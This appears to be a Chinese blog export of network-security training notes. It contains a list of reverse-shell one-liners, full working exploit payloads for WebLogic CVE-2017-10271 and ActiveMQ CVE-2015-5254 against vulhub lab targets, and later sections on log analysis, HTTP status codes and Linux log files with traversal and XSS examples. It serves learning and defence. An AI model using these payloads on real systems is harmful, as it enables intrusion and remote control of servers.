<h1 id="常用反弹shell命令"><a href="#常用反弹shell命令" class="headerlink" title="常用反弹shell命令"></a>常用反弹shell命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[kali_ip]/[nc_port] 0&gt;&amp;1</span><br><span class="line"><span class="comment">#下面的都和第一条等价</span></span><br><span class="line">bash -i &amp;&gt; /dev/tcp/[kali_ip]/[nc_port] 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/[kali_ip]/[nc_port] 0&lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/[kali_ip]/[nc_port] &lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/[kali_ip]/[nc_port] &lt;&amp;2</span><br><span class="line">bash -i 1&gt; /dev/tcp/[kali_ip]/[nc_port] 2&gt;&amp;1 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [kali_ip] [nc_port]&gt;/tmp/f</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/[kali_ip]/[nc_port];<span class="built_in">cat</span> &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span>&gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h1 id="Weblogic-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>OracleWebLogic Server10.3.6.0.0</li>
<li>OracleWebLogic Server12.1.3.0.0</li>
<li>OracleWebLogic Server12.2.1.1.0</li>
<li>OracleWebLogic Server12.2.1.2.0</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>抓包修改payload，nc监听，反弹shell。</p>
<ol>
<li>原数据包：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.137.129:7001</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>修改payload：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第二行修改为靶机IP</span></span><br><span class="line"><span class="comment">#&lt;string&gt;标签改为攻击机IP及监听端口</span></span><br><span class="line"></span><br><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: [靶机ip]:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span><br><span class="line">&lt;java version=<span class="string">&quot;1.4.0&quot;</span> class=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br><span class="line">&lt;void class=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br><span class="line">&lt;array class=<span class="string">&quot;java.lang.String&quot;</span> length=<span class="string">&quot;3&quot;</span>&gt;</span><br><span class="line">&lt;void index=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/[攻击机IP]/[监听端口] 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=<span class="string">&quot;start&quot;</span>/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>nc反弹shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 21</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>删除WebLogic wls-wsat组件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf wlserver_10.3/server/lib/wls-wsat.war</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat/</span><br></pre></td></tr></table></figure>

<h1 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>5.13.0之前5.x版本</li>
</ul>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li>下载jmet的jar文件：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line"></span><br><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> external</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>上传信息给靶机<code>61616</code>端口，明文内容在burpsuite进行base64加密：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#明文消息</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.137.128/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment">#base加密</span></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMjgvNDQ0NCAwPiYx</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传命令</span></span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzMS4xMjgvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME 192.168.137.129 61616</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>本地开启nc监听：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>访问靶机<code>8161</code>端口：<code>http://192.168.137.129:8161/admin/browse.jsp?JMSDestination=event</code>，点击信息，得到反弹shell。</li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x06】安恒厂家网络安全培训 --- day6</title>
    <url>/1078/</url>
    <content><![CDATA[<p>上午讲linux日志分析，包括web攻击痕迹，web状态码，linux系统常用命令及日志文件分析。做了一个暴力破解ssh的示例，并查看靶机日志。</p>
<p>下午配置docker，讲了两个vulhub的实例，一个tomcat文件上传漏洞，一个tomcat ajp 文件读取漏洞。</p>
<span id="more"></span>

<h1 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h1><h2 id="web攻击常见痕迹"><a href="#web攻击常见痕迹" class="headerlink" title="web攻击常见痕迹"></a>web攻击常见痕迹</h2><h3 id="“-”-“-”和”…”请求"><a href="#“-”-“-”和”…”请求" class="headerlink" title="“.” “..”和”…”请求"></a>“.” “..”和”…”请求</h3><p>这些攻击痕迹是非常普遍的用于 web 应用程序和 web 服务器，它用于允许攻击者或者蠕虫病毒程序改变 web 服务器的路径，访问非公开的区域。大多数的 CGI 程序漏洞含有这些”..”请求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：http://localhost/vuln/fi/?page=../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>这个列子展示了攻击者请求passwd这个文件，如果攻击者有能力突破 web 服务器根目录，那么可以获得更多的信息，并进一步的获得特权。 </p>
<h3 id="“-20”请求"><a href="#“-20”请求" class="headerlink" title="“%20”请求"></a>“%20”请求</h3><p>%20 是表示空格的16进制数值，这个请求有时可以帮助执行一些命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：http://localhost/vuln/fi/?page=ls%20-a</span><br></pre></td></tr></table></figure>

<p>这个列子展示了攻击者执行了一个 unix 的命令，列出请求的整个 目录的文件，导致攻击者访问你系统中重要的文件，帮助他进一步取得 特权提供条件。 </p>
<h3 id="“-00”请求"><a href="#“-00”请求" class="headerlink" title="“%00”请求"></a>“%00”请求</h3><p>%00 表示 16 进制的空字节，他能够用于绕过后缀检测，并请求不同类型的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：http://localhost/vuln/fi/?page=index.html</span><br></pre></td></tr></table></figure>

<p>假如这是一个有效的请求，那么攻击者就会开始尝试请求改变 web 服务器的路径。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/vuln/fi/?page=../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>而服务器对请求文件的后缀做了限制，程序只请求.html的文件。那么攻击者可以利用%00字符来截断文件后缀，从而绕过程序检测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/vuln/fi/?page=../../../etc/passwd%00html</span><br></pre></td></tr></table></figure>

<h3 id="“-”请求"><a href="#“-”请求" class="headerlink" title="“|”请求"></a>“|”请求</h3><p>这是个管道字符，在 unix 系统用于帮助在一个请求中同时执行多个系统命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：#cat access_log│ grep -i &quot;..&quot;</span><br></pre></td></tr></table></figure>

<p>（这个命令将显示日志中的”..”请求，常用于发现攻击者和蠕虫攻击）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/vuln/fi/?page=cat%20access_log│ grep%20-i%20&quot;..&quot; </span><br></pre></td></tr></table></figure>

<p>这个请求 cat 命令的执行并且 grep 命令也将执行，查询出”..”</p>
<h3 id="“-”-请求"><a href="#“-”-请求" class="headerlink" title="“;” 请求"></a>“;” 请求</h3><p>在 unix 系统，这个字符允许多个命令在一行执行 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example: </span><br><span class="line"># id;uname -a </span><br><span class="line">（执行 id 命令后，紧跟着执行 uname 命令） </span><br></pre></td></tr></table></figure>

<h3 id="“-lt-”-和-“-gt-”-请求"><a href="#“-lt-”-和-“-gt-”-请求" class="headerlink" title="“&lt;” 和 “&gt;” 请求"></a>“&lt;” 和 “&gt;” 请求</h3><p>应该检查你的日志记录中这两个字符，众多的原因中，首要的一个是这个字符表明了添加数据在文件中 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如： </span><br><span class="line"># echo &quot;test&quot; &gt;&gt; /test （请求写信息在test 这个文件中) </span><br></pre></td></tr></table></figure>

<p>也可以利用这两个字符来篡改页面，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/vuln/fi/?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="“-”请求-1"><a href="#“-”请求-1" class="headerlink" title="“!”请求"></a>“!”请求</h3><p>这种字符请求常用于对 SSI(Server Side Include) 进行攻击，可以用于欺骗用户点击被攻击者设定的连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：http://localhost/vuln/fi/?name=&lt;!%20--#include%20file=&quot; http://hacker/hack.html&quot; --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="状态码详解"><a href="#状态码详解" class="headerlink" title="状态码详解"></a>状态码详解</h2><p>基本上可以分为五类：</p>
<h3 id="1xx-为消息类，该类状态代码用于表示服务器临时回应"><a href="#1xx-为消息类，该类状态代码用于表示服务器临时回应" class="headerlink" title="1xx 为消息类，该类状态代码用于表示服务器临时回应"></a>1xx 为消息类，该类状态代码用于表示服务器临时回应</h3><ul>
<li>100 Continue 表示初始的请求已经被服务器接受，浏览器应当继续发送请求的其余部分</li>
<li>101 Switching Protocols 服务器将遵从客户的请求转换到另外一种协议。</li>
</ul>
<h3 id="2xx-表示浏览器端请求被处理成功"><a href="#2xx-表示浏览器端请求被处理成功" class="headerlink" title="2xx 表示浏览器端请求被处理成功"></a>2xx 表示浏览器端请求被处理成功</h3><ul>
<li><strong>200 OK 一切正常。</strong></li>
<li>201 Created 服务器已经创建了文档，Location 头给出了它的 URL。</li>
<li>202 Accepted 已经接受请求，但处理尚未完成。</li>
<li>203 Non-Authoritative Information 文档已经正常地返回，但一些应答头可能不正确，因为使用的是文档的拷贝。</li>
<li>204 No Content 没有新文档，浏览器应该继续显示原来的文档。这个跟下面的 304 非常相似。</li>
<li>205 Reset Content 没有新的内容，但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。</li>
<li>206 Partial Content 客户发送了一个带有 Range 头的GET请求，服务器完成了它。注意，通过 Range 可以实现断点续传。</li>
</ul>
<h3 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h3><ul>
<li>300 Multiple Choices 客户请求的文档可以在多个位置找到，这些位置已经在返回的文档内列出。如果服务器要提出优先选择，则应该在Location应答头指明。</li>
<li>301 Moved Permanently 客户请求的文档在其他地方，新的URL在Location头中给出，浏览器应该自动地访问新的URL。</li>
<li>**302 Found 类似于301，但新的URL应该被视为临时性的替代，而不是永久性的。注意，在HTTP1.0中对应的状态信息是“Moved Temporatily”。 **<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">出现该状态代码时，浏览器能够自动访问新的URL，因此它是一个很有用的状态代码。 </span><br><span class="line">注意这个状态代码有时候可以和301替换使用。例如，如果浏览器错误地请求http://host/~user ，有的服务器返回301，有的则返回302。 </span><br><span class="line">严格地说，我们只能假定只有当原来的请求是GET时浏览器才会自动重定向。请参见307。</span><br></pre></td></tr></table></figure></li>
<li>303 See Other 类似于301&#x2F;302，不同之处在于，如果原来的请求是POST，Location头指定的重定向目标文档应该通过GET提取。</li>
<li>304 Not Modified 客户端有缓冲的文档并发出了一个条件性的请求(一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档)。服务器告诉客户，原来缓冲的文档还可以继续使用。</li>
<li>305 Use Proxy 客户请求的文档应该通过Location头所指明的代理服务器提取。</li>
<li>307 Temporary Redirect 和302(Found)相同。许多浏览器会错误地响应302应答进行重定向，即使原来的请求是POST，即使它实际上只能在POST请求的应答是303时 才能重定向。由于这个原因，HTTP 1.1新增了307，以便更加清除地区分几个状态代码：当出现303应答时，浏览器可以跟随重定向的GET和POST请求；如果是307应答，则浏览器只 能跟随对GET请求的重定向。</li>
</ul>
<h3 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx 客户端错误"></a>4xx 客户端错误</h3><ul>
<li>400 Bad Request 请求出现语法错误。</li>
<li>401 Unauthorized 客户试图未经授权访问受密码保护的页面。应答中会包含一个WWW-Authenticate头，浏览器据此显示用户名字&#x2F;密码对话框，然后在填写合适的Authorization头后再次发出请求。</li>
<li><strong>403 Forbidden 资源不可用。服务器理解客户的请求，但拒绝处理它。通常由于服务器上文件或目录的权限设置导致。</strong></li>
<li><strong>404 Not Found 无法找到指定位置的资源。这也是一个常用的应答。</strong></li>
<li>405 Method Not Allowed 请求方法(GET、POST、HEAD、Delete、PUT、TRACE等)对指定的资源不适用。</li>
<li>406 Not Acceptable 指定的资源已经找到，但它的MIME类型和客户在Accpet头中所指定的不兼容。</li>
<li>407 Proxy Authentication Required 类似于401，表示客户必须先经过代理服务器的授权。</li>
<li>408 Request Timeout 在服务器许可的等待时间内，客户一直没有发出任何请求。客户可以在以后重复同一请求。</li>
<li>409 Conflict 通常和PUT请求有关。由于请求和资源的当前状态相冲突，因此请求不能成功。</li>
<li>410 Gone 所请求的文档已经不再可用，而且服务器不知道应该重定向到哪一个地址。它和404的不同在于，返回407表示文档永久地离开了指定的位置，而404表示由于未知的原因文档不可用。</li>
<li>411 Length Required 服务器不能处理请求，除非客户发送一个Content-Length头。</li>
<li>412 Precondition Failed 请求头中指定的一些前提条件失败。</li>
<li>413 Request Entity Too Large 目标文档的大小超过服务器当前愿意处理的大小。如果服务器认为自己能够稍后再处理该请求，则应该提供一个Retry-After头。</li>
<li>414 Request URI Too Long URI太长。</li>
<li>416 Requested Range Not Satisfiable 服务器不能满足客户在请求中指定的Range头。</li>
</ul>
<h3 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx 服务器错误"></a>5xx 服务器错误</h3><ul>
<li><strong>500 Internal Server Error 服务器遇到了意料不到的情况，不能完成客户的请求。 (服务端的程序错误)</strong></li>
<li>501 Not Implemented 服务器不支持实现请求所需要的功能。例如，客户发出了一个服务器不支持的PUT请求。</li>
<li><strong>502 Bad Gateway 服务器作为网关或者代理时，为了完成请求访问下一个服务器，但该服务器返回了非法的应答。</strong></li>
<li>503 Service Unavailable 服务器由于维护或者负载过重未能应答。例如，Servlet可能在数据库连接池已满的情况下返回503。服务器返回503时可以提供一个Retry-After头。</li>
<li>504 Gateway Timeout 由作为代理或网关的服务器使用，表示不能及时地从远程服务器获得应答。</li>
<li>505 HTTP Version Not Supported 服务器不支持请求中所指明的HTTP版本。</li>
</ul>
<h2 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h2><h3 id="access-log"><a href="#access-log" class="headerlink" title="access.log"></a>access.log</h3><ol>
<li>记录访问服务器的远程主机地址，从而得知访问者来自何处；</li>
<li>记录访问者请求的资源；</li>
<li>记录访问者使用的浏览器；</li>
<li>记录访问者的访问时间；</li>
</ol>
<p>查看日志，一般短时间几秒内同一IP大量GET、POST请求，则有可能该IP在攻击web服务。</p>
<h2 id="linux系统日志分析"><a href="#linux系统日志分析" class="headerlink" title="linux系统日志分析"></a>linux系统日志分析</h2><h3 id="x2F-var-x2F-log-x2F-各个日志文件分析"><a href="#x2F-var-x2F-log-x2F-各个日志文件分析" class="headerlink" title="&#x2F;var&#x2F;log&#x2F;各个日志文件分析"></a>&#x2F;var&#x2F;log&#x2F;各个日志文件分析</h3><ol>
<li><p><strong>&#x2F;var&#x2F;log&#x2F;messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在&#x2F;var&#x2F;log&#x2F;messages日志中。该日志文件是许多进程日志文件的汇总，从该文件可以看出任何入侵企图或成功的入侵。</strong></p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;boot.log — 包含系统启动时的日志。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;daemon.log — 包含各种系统后台守护进程日志信息。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;dpkg.log – 包括安装或dpkg命令清除软件包的日志。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;lastlog — 记录所有用户的最近信息。该日志文件记录最近成功登录的事件和最后一次不成功的登录事件，由login生成。在每次用户登录时被查询，该文件是二进制文件，需要使用lastlog命令查看，根据UID排序显示登录名、端口号和上次登录时间。如果某用户从来没有登录过，就显示为”<code>Never logged in</code>“。系统账户诸如bin、daemon、adm、uucp、mail等决不应该登录，如果发现这些账户已经登录，就说明系统可能已经被入侵了。若发现记录的时间不是用户上次登录的时间，则说明该用户的账户已经泄密了。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;maillog &#x2F;var&#x2F;log&#x2F;mail.log — 包含来着系统运行电子邮件服务器的日志信息。它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统。例如，sendmail日志信息就全部送到这个文件中。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;user.log — 记录所有等级用户信息的日志。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;Xorg.x.log — 来自X的日志信息。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;alternatives.log – 更新替代信息都记录在这个文件中。</p>
</li>
<li><p><strong>&#x2F;var&#x2F;log&#x2F;btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，<code>last -f /var/log/btmp | more</code>。</strong></p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;cups — 涉及所有打印信息的日志。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。</p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;yum.log — 包含使用yum安装的软件包信息。</p>
</li>
<li><p><strong>&#x2F;var&#x2F;log&#x2F;cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。</strong></p>
</li>
<li><p><strong>&#x2F;var&#x2F;log&#x2F;secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。</strong></p>
</li>
<li><p>&#x2F;var&#x2F;log&#x2F;wtmp或&#x2F;var&#x2F;log&#x2F;utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。utmp可以查看当前在线用户。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wtmp日志文件永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录。</span><br><span class="line">utmp日志文件记录有关当前登录的每个用户的信息。因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会 为用户保留永久的记录。系统中需要查询当前用户状态的程序，如 who、w、users、finger等就需要访问这个文件。该日志文件并不能包括所有精确的信息，因为某些突发错误会终止用户登录会话，而系统没有及时 更新 utmp记录，因此该日志文件的记录不是百分之百值得信赖的。</span><br></pre></td></tr></table></figure>

<ol start="20">
<li><p>&#x2F;var&#x2F;log&#x2F;faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</p>
</li>
<li><p>除了上述Log文件以外，&#x2F;var&#x2F;log还基于系统的具体应用包含以下一些子目录：</p>
</li>
</ol>
<ul>
<li>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;或&#x2F;var&#x2F;log&#x2F;apache2 — 包含服务器access_log和error_log信息。</li>
<li>&#x2F;var&#x2F;log&#x2F;lighttpd&#x2F; — 包含light HTTPD的access_log和error_log。</li>
<li>&#x2F;var&#x2F;log&#x2F;mail&#x2F; –  这个子目录包含邮件服务器的额外日志。</li>
<li>&#x2F;var&#x2F;log&#x2F;prelink&#x2F; — 包含.so文件被prelink修改的信息。</li>
<li>&#x2F;var&#x2F;log&#x2F;audit&#x2F; — 包含被 Linux audit daemon储存的信息。</li>
<li>&#x2F;var&#x2F;log&#x2F;samba&#x2F; – 包含由samba存储的信息。</li>
<li>&#x2F;var&#x2F;log&#x2F;sa&#x2F; — 包含每日由sysstat软件包收集的sar文件。</li>
<li>&#x2F;var&#x2F;log&#x2F;sssd&#x2F; – 用于守护进程安全服务。</li>
</ul>
<h3 id="查看系统的日志实用命令"><a href="#查看系统的日志实用命令" class="headerlink" title="查看系统的日志实用命令"></a>查看系统的日志实用命令</h3><ol>
<li>last命令</li>
</ol>
<p>last命令用于显示用户最近登录信息。单独执行last命令，它会读取<code>/var/log/wtmp</code>的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。wtmp,btmp,utmp均为二进制文件，不能用cat查看，可用last打开。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法：last (选项)（参数）</span></span><br><span class="line">-a 把从何处登入系统的主机名称或ip地址，显示在最后一行。</span><br><span class="line">-d 指定记录文件。指定记录文件。将IP地址转换成主机名称。</span><br><span class="line">-f &lt;记录文件&gt; 　指定记录文件。</span><br><span class="line">-n &lt;显示列数&gt;或-&lt;显示列数&gt; 　设置列出名单的显示列数。</span><br><span class="line">-R 不显示登入系统的主机名称或IP地址。</span><br><span class="line">-x 显示系统关机，重新开机，以及执行等级的改变等信息</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line">last				<span class="comment">#常用用法，不加参数</span></span><br><span class="line">last -n 5 -a -i 			<span class="comment">#最后一列显示IP地址</span></span><br><span class="line">last -n 8 -f  /var/log/btmp        <span class="comment">#该文件更详细，可显示ssh远程登录</span></span><br><span class="line">last -n 10 admin                  <span class="comment">#显示前10个admin登录的记录</span></span><br><span class="line">last -R 10                         <span class="comment">#不显示主机名</span></span><br><span class="line">last –F                            <span class="comment">#显示完整登录登出信息</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>history命令</li>
</ol>
<p>history命令用于显示指定数目的指令命令，读取历史命令文件中的目录到历史命令缓冲区和将历史命令缓冲区中的目录写入命令文件。该命令单独使用时，仅显示历史命令，在命令行中，可以使用符号!执行指定序号的历史命令。例如，要执行第2个历史命令，则输入!2。历史命令是被保存在内存中的，当退出或者登录shell时，会自动保存或读取。在内存中，历史命令仅能够存储1000条历史命令，该数量是由环境变量HISTSIZE进行控制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#语法：history(选项)(参数)</span></span><br><span class="line">-c：清空当前历史命令；</span><br><span class="line">-a：将历史命令缓冲区中命令写入历史命令文件中；</span><br><span class="line">-r：将历史命令文件中的命令读入当前历史命令缓冲区；</span><br><span class="line">-w：将当前历史命令缓冲区命令写入历史命令文件中。</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例：</span></span><br><span class="line"><span class="built_in">history</span> 10                       <span class="comment">#只列出最近10条历史记录</span></span><br><span class="line"><span class="built_in">history</span> | more –a		<span class="comment">#逐屏列出所有的历史记录</span></span><br><span class="line"><span class="built_in">history</span> –c                       <span class="comment">#清空history当前所有历史命令的记录</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>cat命令</li>
</ol>
<p>cat命令连接文件并打印到标准输出设备上，cat经常用来显示文件的内容。</p>
